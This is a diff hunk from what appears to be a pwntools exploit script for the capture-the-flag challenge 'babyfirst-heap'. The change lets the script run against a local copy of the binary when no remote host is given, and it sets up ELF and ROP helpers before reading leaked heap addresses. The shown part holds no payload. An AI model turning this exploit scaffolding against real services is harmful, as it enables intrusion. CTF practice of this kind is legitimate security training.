@@ -7,9 +7,13 @@ context(os = 'linux', arch = 'i386')
 elf = ELF('./babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c')
 rop = ROP(elf)
 
-# Connect and skip header
-# r = process('./babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c')
-r = remote(args['HOST'], int(args['PORT']))
+# Demo should work even without a HOST
+if 'HOST' in args:
+    r = remote(args['HOST'], int(args['PORT']))
+else:
+     r = process('./babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c')
+
+# Skip header
 r.recvuntil('address.\n')
 
 # Receive the heap locations
